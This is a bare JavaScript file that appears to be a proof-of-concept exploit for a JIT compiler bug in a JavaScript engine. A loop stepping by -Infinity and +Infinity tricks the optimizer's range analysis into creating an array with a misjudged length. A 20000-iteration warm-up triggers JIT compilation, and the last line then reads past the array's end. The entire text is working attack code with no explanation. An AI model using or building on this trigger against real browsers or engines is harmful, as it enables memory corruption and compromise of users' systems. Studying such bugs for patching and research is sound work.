function trigger() {
  var x = -Infinity;
  var k = 0;
  for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }

      if (++k > 10) {
        break;
      }
  }

  var value = Math.max(i, 1024);
  value = -value;
  value = Math.max(value, -1025);
  value = -value;
  value -= 1022;
  value >>= 1; // *** 3 ***
  value += 10; //

  var array = Array(value);
  array[0] = 1.1;
  return [array, {}];
};

for (let i = 0; i < 20000; ++i) {
  trigger();
}

console.log(trigger()[0][11]);